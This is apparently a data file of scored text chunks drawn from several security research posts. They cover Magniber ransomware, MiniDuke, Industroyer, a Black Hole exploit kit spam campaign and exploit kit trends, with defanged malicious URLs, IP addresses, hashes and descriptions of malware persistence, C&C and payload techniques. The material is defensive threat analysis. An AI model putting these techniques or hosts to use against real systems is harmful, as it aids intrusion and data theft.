Each time a new file is going to be encrypted, two 16-byte long strings are generated. One will be used as an AES key, and another as an initialization vector (IV). Below you can see the fragment of code responsible for generating those pseudo-random strings.",0.01737549423372664
"Figure 14. Generating pseudo-random strings
The interesting fact is what they use as a random generator—a weak source of randomness may create a vulnerability. We can see that under the hood GetTickCount is called:",0.011044948513837416
"Figure 15. Random generator using GetTickCount
The full reconstruction of the code generating the key and IV is available in the following snippet: https://gist.github.com/hasherezade/7fb69fbd045315b42d7f962a83fdc300
Before the ransomware proceeds to encrypt the file, the RSA key is imported and used to encrypt the generated data (key+IV):",0.011238738885884891
"Figure 16. RSA key import right before file encryption begins
It produces an encrypted block of 256 bytes that is passed to the encrypting function, and later appended at the end of the encrypted file. Apart from those changes, files are encrypted similar to before, with the help of Windows’ Crypto API.",0.011255787113281568
Figure 16. Setting the AES key and initialization vector,0.011071392616022857
"Figure 17. Encrypting and writing to a file
Geographic expansion
In early July, we noted exploit attempts happening outside of the typical area we had become used to, for instance in Malaysia. At about the same time, a tweet from MalwareHunterTeam mentioned infections in Taiwan and Hong Kong.
Following the changes in the distribution scope, the code of Magniber got updated to whitelist more languages. Now the list expanded, adding other Asian languages, such as Chinese (Macau, China, Singapore) and Malay (Malysia, Brunei).",0.01358872600412453
"Figure 17. Expanded language checks
Continuing evolution
While Magniber was not impressive at first, having simple code and no obfuscation, it is actively developed and its quality continuously improves. Their authors appear professional, even though they commit some mistakes.
This ransomware operation is carried with surgical precision, from a careful distribution to a matching whitelist of languages. Criminals know exactly which countries they want to target, and they put their efforts to minimize noise and reduce collateral damage.
Malwarebytes users are protected against this threat thanks to our anti-exploit module, which blocks Magnitude EK’s attempt to exploit CVE-2018-8174 (VBScript engine vulnerability):",0.012627281989641137
"Thanks to David Ledbetter for his help with deobfuscating the VBScript.
Indicators of compromise (IOCs)
178.32.62[.]130,bluehuge[.]expert,Magnigate (Step 1)
94.23.165[.]192,69a5010hbjdd722q.feedrun[.]online,Magnigate (Step 2)
92.222.121[.]30,08taw3c6143ce.nexthas[.]rocks,Magnitude EK (Landing Page)
149.202.112[.]72,Magniber
Code snippets",0.010492598180680934
"Javascript
VBScript",0.007982062246800092
"Magniber (original)
6e57159209611f2531104449f4bb86a7621fb9fbc2e90add2ecdfbe293aa9dfc
Magniber (core DLL)
fb6c80ae783c1881487f2376f5cace7532c5eadfc170b39e06e17492652581c2
",0.010288858171645487
"Miniduke still duking it out
At the end of April Microsoft announced that a vulnerability in Word was actively being exploited. New variants of MiniDuke display interesting and novel features. Here, we take a closer look.",0.016830195537216763
20 May 2014 - 05:40AM,0.010993275635575839
"At the end of April Microsoft announced that a vulnerability in Word was actively being exploited. New variants of MiniDuke display interesting and novel features. Here, we take a closer look.",0.016864695401628937
"At the end of April Microsoft announced that a vulnerability in Word was actively being exploited. This vulnerability occurred in parsing RTF files and was assigned CVE-2014-1761, a thorough analysis of which can be found on the HP Security Research blog. We have since seen multiple cases where this exploit is used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke (also known as Win32/SandyEva).",0.012691246180409843
"MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender. Some of the characteristics of MiniDuke — such as its small size (20 KB), its crafty use of assembly programming, and the use of zero-day exploits for distribution — made it an intriguing threat. Although the backdoor is still quite similar to its previous versions, some important changes were made since last year, the most notable being the introduction of a secondary component written in JScript to contact a C&C server via Twitter.",0.011232073582846835
The RTF exploit document,0.007275128632582284
"The exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to the documents that were used in 2013, which were of a political nature. We received the document on April 8th, only three days after the compilation of the MiniDuke payload, dated April 5th in the PE header. The payload remains quite small at only 24 KB.",0.01255172657676884
"The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and straightforward. After decrypting itself and obtaining the addresses of some functions exported by kernel32.dll, it decrypts and drops the payload in the %TEMP% directory in a file named “a.l” which is subsequently loaded by calling kernel32!LoadLibraryA.",0.01022864165649029
"An interesting thing about the shellcode is that before transferring control to any API function it checks the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by security software and monitoring tools. If any of these are found the shellcode skips the first 5 bytes of the function being called by manually executing prologue instructions (mov edi, edi; push ebp; mov ebp, esp) and then jumping to the function code as illustrated below.  The next graph presents the execution flow of this malware when the exploitation is successful. As mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as the main module and the TwitterJS module.",0.012613409112680829
Execution flow of MiniDuke,0.008664012715143166
Main Component,0.008732263330423318
Installation,0.008178967814575833
"Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the current directory is %TEMP%. If either of those conditions is met the malware assumes it is run for the first time and it proceeds with its installation onto the system. MiniDuke gathers information about the system and encrypts its configuration based on that information, a method also used by OSX/Flashback (this process is called watermarking by Bitdefender). The end result is that it is impossible to retrieve the configuration of an encrypted payload if analyzing it on a different computer. The information collected on infection has not changed since the previous version and consists of the following values:",0.014438967268646685
"volume serial number (obtained from kernel32!GetVolumeInformationA)
CPU information (obtained with the cpuidinstruction)
computer name (obtained from kernel32!GetComputerNameA)",0.021768795974611344
"Once the encrypted version of the malware is created, it is written into a file in the %ALLUSERSPROFILE%\Application Data directory. The name of the file is randomly picked from the following values (you can find this listing and those of the next screenshots on the VirusRadar description:  The filename extension is also picked randomly from the following list:  To persist on the infected system after reboots, the malware creates a hidden .LNK file in the “Startup” directory pointing to the modified main module. The name of the .LNK file is randomly drawn from the following values:  The .LNKfile is created using a COM object with the IShellLinkA interface and contains the following command: “C:\Windows\system32\rundll32.exe %path_to_main_module%, export_function” Which gives something like: “C:\Windows\system32\rundll32.exe C:\DOCUME~1\ALLUSE~1\APPLIC~1\data.cat, IlqUenn“.",0.010390157871211558
Operation,0.010074946961067255
"When the malware is loaded by rundll32.exe and the current directory isn’t %TEMP%, the malware starts with gathering the same system information as described in the “Installation” section to decrypt configuration information. As with the previous version of MiniDuke, it checks for the presence of the following processes in the system:  If any of these are found in the system the configuration information will be decrypted incorrectly, i.e. the malware will run on the system without any communication to C&C servers. If the configuration data is decrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by which to reach C&C server. It looks for the tag “X)))” on the page (MiniDuke was searching for “uri!” in previous samples) and if the tag is found it decrypts a URL from the data that follows it. The Twitter account @FloydLSchwartz does exist but has only retweets and no strings with the special tag.   As the next step, MiniDuke gathers the following information from the infected systems:",0.01412010640791006
"computer name and user domain name
country code of the infected host IP address obtained from http://www.geoiptool.com
OS version information
domain controller name, user name, groups a user account belongs to
a list of AV products installed onto the system
Internet proxy configuration
version of MiniDuke",0.009281448789726476
This information is then sent to the C&C server along with the request to download a payload. The final URL used to communicate with the C&C server looks like this: <url_start>/create.php?<rnd_param>=<system_info> Those tokens are derived as follows:,0.013382140355082894
"url_start – the URL retrieved from the twitter account
rnd_param – randomly generated of lower case alphabet characters parameter name in the query string of the URL
system_info – base64 encoded and encrypted system information",0.010056388650166115
"An example of such a URL is given below:  The payload is downloaded in the file named “fdbywu” using the urlmon!URLDownloadToFileA API:  The downloaded payload is a fake GIF8 file containing encrypted executable. The malware processes the downloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using RSA-2048, then decrypts it, stores in a file and finally executes it. The RSA-2048 public key to verify integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke.",0.012883199063307704
Twitter Generation Algorithm,0.011487055611201558
"In the event that MiniDuke is unable to retrieve a C&C URL from this account, it generates a username to search for based on the current date. The search query changes roughly every seven days and is similar to the backup mechanism in previous versions that was using Google searches. A Python implementation of the algorithm can be found in Appendix B.",0.010080242204618783
TwitterJS component,0.00755388531624368
"The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of code into it and redirecting the exported functions to this code. Here is how the export address table of the patched binary looks after modifications.  This file is then stored in an Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE% folder. Finally this DLL is registered as the Open command when a drive is open, which has the effect of starting the bot every time the user opens a disk drive. Below you can find the content of the init.cmd script used by MiniDuke to install TwitterJS module onto the system.  When loaded, TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the core logic of the module.  Prior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of two separate obfuscations, we can see that the variables have different values. This is probably done to thwart security systems that scan at the entry points of the JScript engine.",0.013390122123710935
Result of first obfuscation,0.008836932863293345
Result of second obfuscation,0.010621264394680141
"The purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute. It first generates a Twitter user to search for; this search term changes every 7 days and is actually a match to the real account name, not the Twitter account name. The bot then visits the Twitter profiles returned by the search and looks for links that end with “.xhtml“. When one is found, it replaces “.xhtml” with “.php” and fetches that link.  Information about the computer is embedded in the Accept HTTP header.  The first link on the retrieved page should contain base64 data; the name attribute of the link is used as a rolling XOR key to decrypt the JScript code. Finally, MiniDuke calculates a hash of the fetched script and compares it with a hardcoded hash in the TwitterJS script. If they match, the fetched script is executed by calling eval().",0.013023543820071426
The tale of the broken SHA-1,0.011612653681578489
The code hashing algorithm used by the component looks very much like SHA-1 but outputs different hashes (you can find the complete implementation in Appendix B. We decided to search for what was changed in the algorithm; one of our working hypotheses was that the algorithm might have been altered to make collisions feasible. We couldn’t find an obvious difference; all the constants and the steps of the algorithm were as expected. Then we noticed that for short messages only the second 32-bit word was different when compared to the original SHA-1.,0.013903463474203015
"SHA1(‘test’) : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
TwitterJS_SHA1(‘test’) : a94a8fe5dce4f01c1c4c0873d391e987982fbbd3",0.014220288488011712
"By examining how this 2nd word was generated we finally discovered that this was caused by a scope issue.  As shown below the SHA-1 function used a variable named f: the function Z() is then called which also uses a variable named f without the var keyword, causing it to be treated as a global variable rather than local to the function. The end result is that the value of f is also changed in the SHA-1 function which affects the value of the 2nd word for that round and ultimately the whole hash for long messages.",0.013736543544304203
A likely explanation of how this problem came to be is that the variable names were changed to single letters using an automated tool prior to embedding it in the payload. The 2 f variables probably had different names in the original script which avoided the issue. So this leaves us with two takeaways: 1) The difference in the hashing algorithm was unintentional and 2) Always declare your local variables with the var keyword. ;-),0.010462912850484063
Twitter DGA accounts,0.011329795390419228
"We generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered. At the moment only one exists, @AA2ADcAOAA, which is the TwitterJS account that was generated between August 21st and 27th 2013. This account has no tweets. In an effort to discover potential victims, we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS components and set up tweets with encrypted URLs so that an infected computer would reach out to our server. So far we have received connections via the TwitterJS accounts from four computers located in Belgium, France and the UK. We have contacted national CERTs to notify the affected parties. We detect the RTF exploit document as Win32/Exploit.CVE-2014-1761.D and the MiniDuke components as Win32/SandyEva.G.",0.010616111499871628
Appendix A: SHA-1 hashes,0.010663824187707838
"SHA-1
Description",0.010820281621404249
"58be4918df7fbf1e12de1a31d4f622e570a81b93
RTF with Word exploit CVE-2014-1761",0.007324596070572786
"b27f6174173e71dc154413a525baddf3d6dea1fd
MiniDuke main component (before config encryption)",0.009836520275272487
"c059303cd420dc892421ba4465f09b892de93c77
TwitterJS javascript code",0.007792132686965214
"Appendix B &C: DGA algorithms, Twitter DGA accounts",0.012572038774733452
"The DGA scripts and account lists have been moved to our Github account : https://github.com/eset/malware-research/tree/master/miniduke
",0.010126334322555497
"A Week in Security (Mar 13 – Mar 19)
Last week, we touched on a 419 scam, modding on games (in general), a much talked about iCloud scam that “may be worse than ransomware”—not to mention a number of threats targeting Apple users—and a Steam scam.
Senior security researcher Jérôme Segura had once again unearthed a couple of malvertising campaigns. First, Segura revealed another round of malicious ads from online top publishers, which include (but are not limited to) The New York Times and The BBC. Just like one campaign he discussed back in January, this also leads to an Angler exploit infection. Second, Segura also found a targeted campaign against UK internet users. Specifically, ads on the legitimate news site called The Daily Mail was found pointing to rogue or shadowed sub-domains responsible for the redirection to Angler download sites.
We also did a deconstruction of a TeslaCrypt spam campaign and highlighted an interesting adware called TopFlix that displays ads and modifies a system’s DNS for last week’s PUP Friday post.
Notable news stories and security related happenings:",0.013954310673892412
"Instagram Hackers Stole Tens of Thousands of Euros from Users. “Two young Dutch hackers were arrested on Sunday. The police believe the two hackers, aged 18 and 19, hacked into a large number of Instagram accounts and thereby managed to steal tens of thousands of euros in advertising revenue from the real users, NOS report.” (Source: Netherlands Times)
CVE-2013-5838 Java Flaw is Back Two-year Later Due to Broken Patch. “Bad news for Java users: In 2013 Oracle released a patch to fix the CVE-2013-5838 vulnerability, but security experts discovered that it could be easily bypassed to compromise the latest versions of the software. This means that attackers can exploit again the same vulnerability hacking machines running the latest versions of Java.” (Source: Security Affairs)
The Two Misconceptions Dominating the Encryption Debate. “Cybersecurity is a massive challenge affecting everyone –- startups, government, corporate systems and consumers, costing the global economy billions of dollars annually. Tragically, the one solution we are seriously considering — mandating encryption backdoors — will undermine the integrity of our networks, as confirmed by information security experts and the government’s own defense and intelligence officials.” (Source: TechCrunch)
Cybersecurity Training, Military Style. “Cybersecurity training programs modeled on military tactics are making their way to the private sector. Similar to how the armed forces stage war games to test the readiness of their troops for battle, these “hands on” training programs put companies through simulated breaches designed to test the effectiveness of the security tools, policies and teams they’ve put in place to defend themselves.” (Source: The Wall Street Journal)
Two-factor Authentication (2FA) Versus Two-step Verification (2SV). “As we go about our online lives, many of us have considered enabling two-factor authentication (2FA) or two-step verification (2SV) on our accounts. Both measures introduce another element into a service’s login process. For that reason, plenty of reputable sources online have left the impression that there is no difference between the two concepts. But those reports are wrong.” (Source: Graham Cluley’s Blog)
It’s Time to Kill the Static Password. “If you feel passwords are a struggle to manage, you are not alone. A recent UK Government study found that nearly half of respondents used unsafe passwords, such as the names of their pets, for fear of forgetting them.” (Source: Help Net Security)
Music Streaming has a Nearly Undetectable Fraud Problem. “Right now, Spotify, Tidal, and Rhapsody are all battling multi-million-dollar lawsuits alleging copyright issues and improper royalty payments—with one seeking as much as $150 million in damages. But amid all the high-profile tumult, music streaming is facing a much more quiet, insidious problem: Click fraud.” (Source: Quartz)
Typosquatters Target Mac Users With New ‘.om’ Domain Scam. “According to Endgame security researchers, the top level domain for Middle Eastern country Oman (.om) is being exploited by typosquatters who have registered more than 300 domain names with the .om suffix for U.S. companies and services such as Citibank, Dell, Macys and Gmail. Endgame made the discovery last week and reports that several groups are behind the typosquatter campaigns.” (Source: Kaspersky’s Threat Post)
A History of Ransomware. “A recent study titled, ‘Battling the Big Hack’ by Spiceworks found that 80 percent of organizations experienced an IT security incident in 2015, with 53 percent of respondents having a concern for ransomware in 2016. But how did we get here? And how can we avoid these growing attacks in the coming year and beyond?” (Source: CSO Online)
Internet of Things: Humble Lightbulbs could Become a Form of Attack. “If anyone in the technology industry believes the cyber security risk posed by the internet of things is exaggerated, then Daniel Miessler, a director at IOActive, a security company, is keen to put them straight. IOActive has published a paper detailing how its researchers were able to take control of a sport utility vehicle without the investigators even touching the car.” (Source: Financial Times)
A Third of Businesses in the UK Believe They will be Hacked in 2016, Survey Shows. “Economists at the Centre for Economic and Business Research modelled how a real cyberattack would affect a cross-section of the British economy, including the telecoms, utilities, retail, banking and insurance sectors, The Telegraph noted. They found telecom companies were the most vulnerable due to the nature of sensitive information stored, the value of the data and low levels of investment in cyber security.” (Source: BitDefender’s Hot for Security Blog)
Finally, Someone to Blame for the Ransomware Surge, Just Don’t Feed the Hackers. “The end of last year saw a significant uptick in incidents where system administrators were denied access to their technology until they paid hackers ransom. These so called ransomware attacks have become more prevalent thanks in part to thriving cybercriminal networks on the dark Web, but now three security firms said there’s a specific culprit to blame: China.” (Source: FierceCIO)
Steam Stealer Malware ‘Booming Business’ for Attackers Targeting Gaming Service. “Santiago Pontiroli, a researcher with Kaspersky Lab’s Global Research and Analysis Team, and Bart P, an independent security researcher, published a thorough analysis of the service on Tuesday on Securelist and examined how malware targeting it has evolved through the last few years.” (Source: Kaspersky’s Threat Post)
Business Email Compromise Fraud Rising Fast, Hard to Fight. “According to ZapFraud, these kinds of spear phishing attacks, known as business email compromise (BEC), now account for 4 percent of the total volume of scams, up from from less than 1 percent in 2011.” (Source: CSO)
Biometrics are Coming, Along with Serious Security Concerns. “Databases get hacked all the time, from the IRS to Target to hospitals and banks, and until some of the very real security concerns surrounding the use of biometric technologies are better ironed out, you wouldn’t be wrong to worry about linking data about your body parts to online accounts.” (Source: Wired)
Pedophiles May Be Using Anonymous’ Symbolic Mask To Trap Children. “According to reports, pedophiles are using Anonymous mask or guy Fawkes mask to lure young kids and share objectionable content. It seems like pedophiles are pretending to be part of the hacktivist group and its movement against injustice through creating bogus Facebook and Twitter profiles of Anonymous but in reality, they are trapping the kids online.” (Source: Hack Read)
To Bypass Code-signing Checks, Malware Gang Steals Lots of Certificates. “There are lots of ways to ensure the success of an advanced hacking operation. For a gang called Suckfly, one of the keys is having plenty of stolen code-signing certificates on hand to give its custom malware the appearance of legitimacy.” (Source: Ars Technica)
Google Starts Tracking, Encourages Worldwide HTTPS Usage. “Google has added a new section to its Transparency Report, which will allow users to keep an eye on Google’s use of HTTPS, and HTTPS use of the top 100 non-Google sites on the Internet. With this new section, Google is hoping to spur more sites towards using HTTPS, as well as showing the progress of their own efforts.” (Source: Help Net Security)
Malware Increasingly Making its Way into Organizations Through Social Media. “The report found just 54 percent of organizations feature a written policy governing the use of public social networks, while just 51 percent have policies governing enterprise social media usage. This is despite the survey finding 82 percent of organization use Microsoft SharePoint for enterprise social purposes, while more than half of surveyed organizations use each of Facebook, Twitter and LinkedIn.” (Source: LegalTech News)
Ransomware Will Spike As More Cybercrime Groups Move In. “Take the Dridex group, a Russian cybercrime gang that until now has been known mainly for operating one of the most successful banking Trojans ever. The group is believed to be behind a recently released ransomware tool dubbed Locky that has begun proliferating in a major way on computers worldwide.” (Source: Dark Reading)",0.014629222061047109
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
"Industroyer: Biggest threat to industrial control systems since Stuxnet
ESET has analyzed a sophisticated and extremely dangerous malware, known as Industroyer, which is designed to disrupt critical industrial processes.",0.025547360733870206
Anton Cherepanov,0.012177145254436028
Robert Lipovsky,0.009327268366459585
12 Jun 2017 - 02:00PM,0.01107534883913186
"ESET has analyzed a sophisticated and extremely dangerous malware, known as Industroyer, which is designed to disrupt critical industrial processes.",0.029441838026167177
"Update (July 17th): The authors of the Industroyer research, Anton Cherepanov and Robert Lipovsky, will present their findings at Black Hat USA in Las Vegas on July 26th, 2017. More information can be found here.",0.015624982699403933
"The 2016 attack on Ukraine’s power grid that deprived part of its capital, Kiev, of power for an hour was caused by a cyberattack. ESET researchers have since analyzed samples of malware, detected by ESET as Win32/Industroyer, capable of performing exactly that type of attack.",0.01258313336203487
"Whether the same malware was really involved in what cybersecurity experts consider to have been a large-scale test is yet to be confirmed. Regardless, the malware is capable of doing significant harm to electric power systems and could also be refitted to target other types of critical infrastructure.",0.013449741883132416
"Industroyer is a particularly dangerous threat, since it is capable of controlling electricity substation switches and circuit breakers directly. To do so, it uses industrial communication protocols used worldwide in power supply infrastructure, transportation control systems, and other critical infrastructure systems (such as water and gas).",0.01581921665665098
"These switches and circuit breakers are digital equivalents of analogue switches; technically they can be engineered to perform various functions. Thus, the potential impact may range from simply turning off power distribution, cascading failures and more serious damage to equipment. The severity may also vary from one substation to another, as well. Needless to say, disruption of such systems can directly or indirectly affect the functioning of vital services.",0.015579843476674515
Win32/Industroyer: A new threat for industrial control systems,0.009181332467777858
Download Research Paper,0.008999967026157907
"Industroyer’s dangerousness lies in the fact that it uses protocols in the way they were designed to be used. The problem is that these protocols were designed decades ago, and back then industrial systems were meant to be isolated from the outside world. Thus, their communication protocols were not designed with security in mind. That means that the attackers didn’t need to be looking for protocol vulnerabilities; all they needed was to teach the malware “to speak” those protocols.",0.01477498045985981
"The recent power outage occurred on December 17th, 2016, almost exactly one year after the well-documented cyberattack that caused a blackout that affected around 250,000 households in several regions in Ukraine on December 23rd, 2015.",0.016814555102682927
"In 2015, the perpetrators infiltrated the electricity distribution networks with the BlackEnergy malware, along with KillDisk and other malicious components, and then abused legitimate remote access software to control operators’ workstations and to cut off power. Aside from targeting the Ukrainian power grid, there are no apparent similarities in code between BlackEnergy and Industroyer.",0.01406815288207841
Structure and key functionalities,0.00896460994975401
Industroyer is modular malware. Its core component is a backdoor used by attackers to manage the attack: it installs and controls the other components and connects to a remote server to receive commands and to report to the attackers.,0.011699491874482715
"What sets Industroyer apart from other malware targeting infrastructure is its use of four payload components, which are designed to gain direct control of switches and circuit breakers at an electricity distribution substation.",0.017699991634977263
"Each of these components targets particular communication protocols specified in the following standards: IEC 60870-5-101, IEC 60870-5-104, IEC 61850, and OLE for Process Control Data Access (OPC DA).",0.021020225828324857
"Generally, the payloads work in stages whose goals are mapping the network, and then figuring out and issuing commands that will work with the specific industrial control devices. Industroyer’s payloads show the authors’ deep knowledge and understanding of industrial control systems.",0.019137331271239955
"The malware contains a few more features that are designed to enable it to remain under the radar, to ensure the malware’s persistence, and to wipe all traces of itself after it has done its job.",0.013233609127759172
"For example, the communication with the C&C servers hidden in Tor can be limited to non-working hours. Also, it employs an additional backdoor – masquerading as the Notepad application – designed to regain access to the targeted network in case the main backdoor is detected and/or disabled.",0.011408268342221861
"And its wiper module is designed to erase system-crucial Registry keys and overwrite files to make the system unbootable and the recovery harder. Of interest is the port scanner that maps the network, trying to find relevant computers: the attackers made their own custom tool instead of using existing software. Finally, yet another module is a Denial-of-Service tool that exploits the CVE-2015-5374 vulnerability in Siemens SIPROTEC devices and can render targeted devices unresponsive.",0.010220543141883254
Conclusion,0.008171308922719556
"Industroyer is highly customizable malware. While being universal, in that it can be used to attack any industrial control system using some of the targeted communication protocols, some of the components in analyzed samples were designed to target particular hardware. For example, the wiper component and one of the payload components are tailored for use against systems incorporating certain industrial power control products by ABB, and the DoS component works specifically against Siemens SIPROTECT devices used in electrical substations and other related fields of application.",0.013658751342063513
"While in principle it’s difficult to attribute attacks to malware without performing an onsite incident response, it’s highly probable that Industroyer was used in the December 2016 attack on the Ukrainian power grid. On top of the fact that the malware clearly possesses the unique capabilities to perform the attack, it contains an activation timestamp for December 17th, 2016, the day of the power outage.",0.01410471288248194
"The 2016 attack on the Ukrainian power grid attracted much less attention than the attack that occurred a year earlier. However, the tool most likely used, Win32/Industroyer, is an advanced piece of malware in the hands of a sophisticated and determined attacker.",0.012021056193565416
"Thanks to its ability to persist in the system and provide valuable information for tuning-up the highly configurable payloads, attackers could adapt the malware to any environment, which makes it extremely dangerous. Regardless of whether or not the recent attack on the Ukrainian power grid was a test, it should serve as a wake-up call for those responsible for security of critical systems around the world.",0.011833910881232979
"Additional technical details on the malware and Indicators of Compromise can be found in our comprehensive white paper, and on github. For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset.com.",0.015434556573092117
"BEFORE YOU GO: Industroyer2: Industroyer reloaded
",0.010485462952303681
"In the midst of the holidays season, cybercriminals are currently spamvertising tens of thousands of malicious “Flight Reservation Confirmations“, in an attempt to trick users into clicking on the link found in the fake emails. Once they click on the link, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.013808369015872124
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample compromised URLs used in the campaign: hxxp://minjust.isfb.ru/mail.htm; hxxp://wrigglepot.com/mail.htm
Sample client-side exploits serving URL: hxxp://cinemaallon.ru:8080/forum/links/column.php
Sample malicious payload dropping URL: hxxp://cinemaallon.ru:8080/forum/links/column.php?column.php?
swo=030b360207&amp;sdxuyi=46&amp;wgqadt=3307093738070736060b&amp;jtoasosd=02000200020002%22%20width=%221%22%20height=%221%22
Sample client-side exploits served: CVE-2010-0188
Surprisingly, upon successful client-side exploitation, the campaign returns an empty response, indicating that the cybercriminals behind the campaign have applied a low QA (Quality Assurance) to this particular campaign.
Malicious domain name reconnaissance:
cinemaallon.ru – 42.121.116.38 (AS37963); 202.180.221.186 (AS24496); 208.87.243.131 (AS40676)
ns1.cinemaallon.ru – 62.76.189.72
ns2.cinemaallon.ru – 41.168.5.140
ns3.cinemaallon.ru – 132.248.49.112
ns4.cinemaallon.ru – 209.51.221.247
ns5.cinemaallon.ru – 208.87.243.196
ns6.cinemaallon.ru – 216.99.149.226
We’ve already seen these IPs in the recently profiled “Malicious ‘Sendspace File Delivery Notifications’ lead to Black Hole Exploit Kit“, indicating that both campaigns have been launched by the same malicious party.
We’re also aware of more client-side exploits serving URLs that used to respond to these IPs in the past, for instance:
hxxp://ganiopatia.ru:8080/forum/links/column.php
hxxp://publicatorian.ru:8080/forum/links/public_version.php
hxxp://dimarikanko.ru:8080/forum/links/column.php
hxxp://podarunoki.ru:8080/forum/links/column.php
hxxp://gurmanikia.ru:8080/forum/links/column.php
hxxp://somaliaonfloor.ru:8080/forum/links/public_version.php
hxxp://aliamognoa.ru:8080/forum/links/public_version.php
hxxp://cinemaallon.ru:8080/forum/links/column.php
hxxp://leberiasun.ru:8080/forum/links/column.php
hxxp://dimarikanko.ru:8080/forum/links/column.php
hxxp://delemiator.ru:8080/forum/links/column.php
hxxp://ganalionomka.ru:8080/forum/links/public_version.php
Dropped MD5s upon successful client-side exploitation:
hxxp://ganiopatia.ru:8080/forum/links/column.php – MD5: a8ccedc5fe10ea98cb84a8ad20901d8e – detected by 28 out of 44 antivirus scanners as Worm:Win32/Cridex.E
hxxp://dimarikanko.ru:8080/forum/links/column.php – MD5: a8ccedc5fe10ea98cb84a8ad20901d8e – detected by 28 out of 44 antivirus scanners as Worm:Win32/Cridex.E
hxxp://podarunoki.ru:8080/forum/links/column.php – MD5: a8ccedc5fe10ea98cb84a8ad20901d8e – detected by 28 out of 44 antivirus scanners as Worm:Win32/Cridex.E
hxxp://dimarikanko.ru:8080/forum/links/column.php – MD5: a8ccedc5fe10ea98cb84a8ad20901d8e – detected by 28 out of 44 antivirus scanners as Worm:Win32/Cridex.E
hxxp://delemiator.ru:8080/forum/links/column.php – MD5: 8229f69bc416cdca7f314f19fe7b4e18 – detected by 36 out of 44 antivirus scanners as Worm:Win32/Cridex.E
hxxp://ganalionomka.ru:8080/forum/links/public_version.php – MD5: 08389cb32629aeb9dcb178dfde9bf728 – detected by 31 out of 46 antivirus scanners as Worm:Win32/Cridex.E
hxxp://publicatorian.ru:8080/forum/links/public_version.php – MD5: b59e13c6a3c6c1ccd322ba39a7085f08 – detected by 25 out of 45 antivirus scanners as Worm:Win32/Cridex.E
Responding to these IPs (42.121.116.38 (AS37963); 202.180.221.186 (AS24496); 208.87.243.131 (AS40676) are also the following malicious domains:
ganiopatia.ru
pelamutrika.ru
francese.ru
podarunoki.ru
publicatorian.ru
cinemaallon.ru
pitoniamason.ru
leberiasun.ru
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01329077177125959
"Exploit kits: Winter 2018 review
In the past, we used to do a blog series on exploit kits where we would periodically check in on the main players in the market. In March 2017, we wrote the Winter 2017 review, before exploit kit activity dropped down to a whisper. We’ve since discontinued our blog series, for lack of developments.
A year later, however, exploit kits are showing signs of life. An uptick in campaigns and the sharpshooter-like targeting of a single country make exploits once again worth writing about.
Overview
RIG EK still remains the most common exploit kit used by different actors in a diverse set of malvertising campaigns. We haven’t observed Terror EK since Fall 2017, but another older kit has made a comeback. And even though it remains largely unsophisticated, GrandSoft EK has maintained its activity.
While we aren’t seeing Sundown EK anymore, a spin-off named GreenFlash Sundown was the first (and only so far) to leverage a new Flash Player zero-day and distribute ransomware. Magnitude EK is the other exploit kit also consistently dropping its own Magniber ransomware.
Today’s exploit kits rely on Internet Explorer and Flash Player vulnerabilities for exploitation. We found it particularly interesting that many of those exploit kits are targeting South Korea specifically.
Coincidentally or not, both CVE-2016-0189 (IE) and CVE-2018-4878 (Flash) were both first used in targeted zero-day attacks against South Korea before they were added into EKs.",0.01769396740640583
"RIG-v EK
RIG EK is by far the most popular exploit kit these days, with many different distribution campaigns and, as a result, the most diverse payloads (banking Trojans, coin miners, and ransomware, to name a few).",0.01801925744299271
"GrandSoft EK
GrandSoft is an older exploit kit that, for a strange reason, decided to make a comeback. Its code is simplistic and decipherable, and it uses rotating hostnames. GrandSoft was used to distribute the GandCrab ransomware in late January, but has also been observed dropping AZORult stealer, QuantLoader, and of course, miners.",0.014900740354121034
"GreenFlash Sundown
GreenFlash Sundown is an interesting exploit kit that uses URI patterns that are almost impossible to match without causing false positives. It makes heavy use of the Flash Player to hide its redirections and malicious calls rather than relying on typical HTML/JS. Beyond this stealth feature, it is also the first exploit kit to integrate a newly-found Flash Player zero-day to target South Koreans with the Hermes ransomware.",0.014517738605738462
"Magnitude EK
Magnitude is a long-standing exploit kit that for some time now has been exclusively focusing on South Korea. Contrary to GreenFlash Sundown, it has dropped all support for the Flash Player and only relies on Internet Explorer for exploitation. Magnitude comes with its very own payload, Magniber, a piece of ransomware that once again only targets South Korea.",0.015893901411751288
"Mitigation
We ran all these exploit kits in our lab using Internet Explorer 10 and two different versions of the Flash Player. For GreenFlash Sundown, we updated our version of Flash to 28.0.0.137 to trigger the newest zero-day. Malwarebytes stopped all these exploit attempts before any payload had a chance to be dropped or executed.",0.013745168823785958
"Summary
While exploit kits are struggling to stay relevant in a browser market share dominated by Google Chrome and a rapid decline in Flash Player usage, we have noted that several different actors are still engaged in distribution via multiple malvertising chains. Some of these actors have taken over tools once used in broader campaigns to distribute their own payload and narrow down their targets to a single country.
Even though exploit kits have not evolved much in terms of firepower, the traffic distribution systems and gates leading to them remain active and diverse. For this reason, threat actors often mix traffic-based on user-agent information to divert victims toward exploit kits or social engineering–based attacks, if the former is not deemed to be a viable option.
Acknowledgment
Thanks to @nao_sec for additional information about GrandSoft EK.
",0.012826763592992063
